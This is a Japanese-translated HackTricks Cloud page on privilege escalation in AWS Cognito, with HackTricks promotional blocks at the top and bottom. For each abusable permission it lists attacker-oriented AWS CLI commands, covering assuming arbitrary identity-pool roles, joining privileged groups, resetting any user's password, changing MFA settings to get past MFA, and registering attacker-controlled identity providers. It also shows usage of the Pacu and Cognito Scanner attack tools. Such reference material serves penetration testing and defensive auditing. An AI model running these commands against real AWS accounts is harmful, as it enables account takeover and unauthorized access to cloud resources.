# AWS - Cognito Privesc

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## Cognito

Cognitoについての詳細は以下をチェックしてください:

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### ツール

* [Pacu](https://github.com/RhinoSecurityLabs/pacu)は、AWSのエクスプロイトフレームワークで、"cognito\_\_enum"と"cognito\_\_attack"モジュールが含まれており、アカウント内のすべてのCognitoアセットの列挙と、弱い設定、アクセス制御に使用されるユーザー属性などのフラグ付けを自動化し、また、MFAサポートを含むユーザー作成と、変更可能なカスタム属性、使用可能なアイデンティティプールの資格情報、idトークン内の引き受け可能なロールなどに基づく権限昇格を自動化します。

モジュールの機能の説明については、[ブログ投稿](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2)のパート2を参照してください。インストール手順については、メインの[Pacu](https://github.com/RhinoSecurityLabs/pacu)ページを参照してください。

#### 使用方法

特定のアイデンティティプールとユーザープールクライアントに対してユーザー作成とすべてのprivescベクトルを試みるcognito\_\_attackの使用例：
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
```
Sample cognito__enumの使用例は、現在のAWSアカウントで見えるすべてのユーザープール、ユーザープールクライアント、アイデンティティプール、ユーザーなどを収集するためです:
```
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) は、Cognitoに対するさまざまな攻撃を実装したpythonのCLIツールで、privescエスカレーションを含みます。

#### インストール
```bash
$ pip install cognito-scanner
```
#### 使用方法
```bash
$ cognito-scanner --help
```
詳細については、https://github.com/padok-team/cognito-scanner を確認してください。

### Identity Pool からの認証情報の収集

Cognito は、**認証済み**および**未認証のユーザー**に**IAM ロールの認証情報**を付与できるため、アプリケーションの**Identity Pool ID**を見つけることができれば（アプリケーションにハードコードされているべきです）、新しい認証情報を取得し、したがってprivesc（以前はAWSアカウントで任意の認証情報を持っていなかった可能性が高い）を実行できます。

詳細については[**このページを確認してください**](../aws-unauthenticated-enum-access/#cognito)。

**潜在的な影響：** 未認証ユーザー（おそらく認証済みユーザーに添付されているものも）に添付されているサービスロールへの直接のprivesc。

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

この権限を持っていると、Cognito アプリの認証済み/未認証ユーザーに**任意のCognito ロール**を付与できます。
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
Cognitoアプリに**未認証ユーザーが有効になっていない場合**、`cognito-identity:UpdateIdentityPool`の権限も必要になることがあります。

**潜在的な影響：** 任意のCognitoロールへの直接的な権限昇格。

### `cognito-identity:update-identity-pool`

この権限を持つ攻撃者は、例えば自分のコントロール下にあるCognitoユーザープールや、**このCognito Identity Poolにアクセスする方法として**ログインできる他のアイデンティティプロバイダーを設定することができます。その後、そのユーザープロバイダーに**ログイン**するだけで、Identity Poolに設定されている認証済みロールに**アクセスすることができます**。
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
この権限を**基本認証を許可するために悪用することも可能です**：
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**潜在的影響**: 設定された認証済みIAMロールがアイデンティティプール内で侵害される可能性があります。

### `cognito-idp:AdminAddUserToGroup`

この権限により、**CognitoユーザーをCognitoグループに追加**することができるため、攻撃者はこの権限を悪用して、自分のコントロール下にあるユーザーを、**より良い**権限を持つ他のグループや**異なるIAMロール**に追加することができます：
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**潜在的影響：** 他のCognitoグループとUser Pool GroupsにアタッチされたIAMロールへのPrivesc。

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

これらの権限を持つ攻撃者は、**コンプロマイズされたCognito Identity Providerによって使用できるすべてのIAMロール**を持つ**グループを作成/更新**し、コンプロマイズされたユーザーをグループの一部にして、それらのロールにアクセスできます：

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**潜在的影響：** 他のCognito IAMロールへのPrivesc。

### `cognito-idp:AdminConfirmSignUp`

この権限により、**サインアップを確認**することができます。デフォルトでは、誰でもCognitoアプリケーションにサインインできますが、そのままにしておくと、ユーザーは任意のデータでアカウントを作成し、この権限でそれを確認できる可能性があります。
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**潜在的影響：** 認証済みユーザーのIdentity Pool IAMロールへの間接的な権限昇格が可能で、新しいユーザーを登録できる場合。また、任意のアカウントを確認できることで、他のアプリ機能への間接的な権限昇格も可能です。

### `cognito-idp:AdminCreateUser`

この権限により、攻撃者はユーザープール内に新しいユーザーを作成できます。新規ユーザーは有効として作成されますが、パスワードを変更する必要があります。
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**潜在的影響：** 認証されたユーザーのためのアイデンティティプールIAMロールへの直接的な権限昇格。任意のユーザーを作成できることによる他のアプリ機能への間接的な権限昇格。

### `cognito-idp:AdminEnableUser`

この権限は、攻撃者が無効にされたユーザーの認証情報を見つけ、**再度有効にする必要がある**場合など、非常に限定的なシナリオで役立つ可能性があります。
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**潜在的影響：** 認証されたユーザーのアイデンティティプールIAMロールへの間接的なprivescと、無効なユーザーの資格情報を持っていた攻撃者のユーザー権限の漏洩。

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

この権限により、[**方法 ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**を使用してログインすることができます。** 詳細はリンクを参照してください。

### `cognito-idp:AdminSetUserPassword`

この権限により、攻撃者は**任意のユーザーのパスワードを変更することができ**、MFAが有効になっていない任意のユーザーになりすますことができます。
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**潜在的な影響：** 直接的な権限昇格が可能であり、各ユーザーがメンバーである全てのグループへのアクセス、およびIdentity Pool認証済みIAMロールへのアクセスが可能です。

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: 攻撃者はこの権限を悪用して、自分の管理下にある携帯電話を**SMS MFAのユーザー**として設定する可能性があります。
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** 前述のものと同様に、この権限を使用してユーザーのMFA設定を変更し、MFA保護をバイパスすることができます。
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: 前述の権限と同様に、この権限を使用してユーザープールのMFA設定を変更し、MFA保護をバイパスすることができます。
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** ユーザープールを更新してMFAポリシーを変更することも可能です。[CLIはこちらをチェック](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html)。

**潜在的な影響:** 攻撃者がその資格情報を知っている可能性のある任意のユーザーに対する間接的な権限昇格であり、これによりMFA保護をバイパスすることができます。

### `cognito-idp:AdminUpdateUserAttributes`

この権限を持つ攻撃者は、より多くの権限を得ようとして、自分のコントロール下にあるユーザーのメールアドレスや電話番号、または他の属性を変更することができます。\
これにより、メールアドレスや電話番号を変更し、それを検証済みとして設定することができます。
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**潜在的影響：** Cognito User Poolを使用する基盤となるアプリケーションで、ユーザー属性に基づいて権限を与える間接的な権限昇格の可能性。

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

この権限を持つ攻撃者は、既存のプールクライアントよりも**制限の少ない新しいUser Pool Clientを作成**することができます。例えば、新しいクライアントは、どのような認証方法も許可し、シークレットを持たず、トークンの無効化を無効にし、トークンがより長い期間有効であることを許可するかもしれません...

同じことが、新しいクライアントを作成する代わりに、**既存のクライアントを変更する**ことで行うことができます。

[**コマンドライン**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html)（または[**更新コマンド**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)）で、すべてのオプションを確認できます。チェックしてみてください！
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**潜在的影響：** Identity Pool の承認されたユーザーに対する間接的な権限昇格の可能性があります。これは、新しいクライアントを作成してセキュリティ対策を緩和し、攻撃者が作成したユーザーでログインできるようにすることで実現します。

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

攻撃者はこの権限を悪用して、新しいユーザーを含むcsvをアップロードすることでユーザーを作成する可能性があります。
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
**潜在的影響：** 認証済みユーザーのためのアイデンティティプールIAMロールへの直接的な権限昇格。任意のユーザーを作成できることによる他のアプリ機能への間接的な権限昇格。

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

攻撃者は新しいアイデンティティプロバイダーを作成し、**このプロバイダーを通じてログインする**ことができるようになる可能性があります。
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**潜在的な影響：** 認証されたユーザーのIdentity Pool IAMロールへの直接的な権限昇格。他のアプリ機能に任意のユーザーを作成できる間接的な権限昇格。

### cognito-sync:\* 分析

これはCognito Identity Poolsのロールでデフォルトで非常に一般的な権限です。AWSからのワイルドカードが常に悪い印象を与える（特に）にもかかわらず、**攻撃者の観点から与えられた権限はそれほど有用ではありません**。

この権限はIdentity Poolsのユーザー情報とIdentity Pools内のIdentity IDsを読むことを許可します（これは機密情報ではありません）。\
Identity IDsには、セッションの情報（AWSはそれを**セーブされたゲーム**のように定義しています）である[**Datasets**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html)が割り当てられている可能性があります。これにはある種の機密情報が含まれている可能性があります（しかし、可能性はかなり低いです）。この情報にアクセスする方法は[**列挙ページ**](../aws-services/aws-cognito-enum/)で見つけることができます。

攻撃者はまた、これらのデータセットの変更を公開するCognitoストリームに自分を登録するか、cognitoイベントにトリガーする**lambda**を使用することもできます。これが使用されるのを見たことはなく、ここで機密情報を期待することはありませんが、不可能ではありません。

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションです。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加するか**、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローしてください**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>
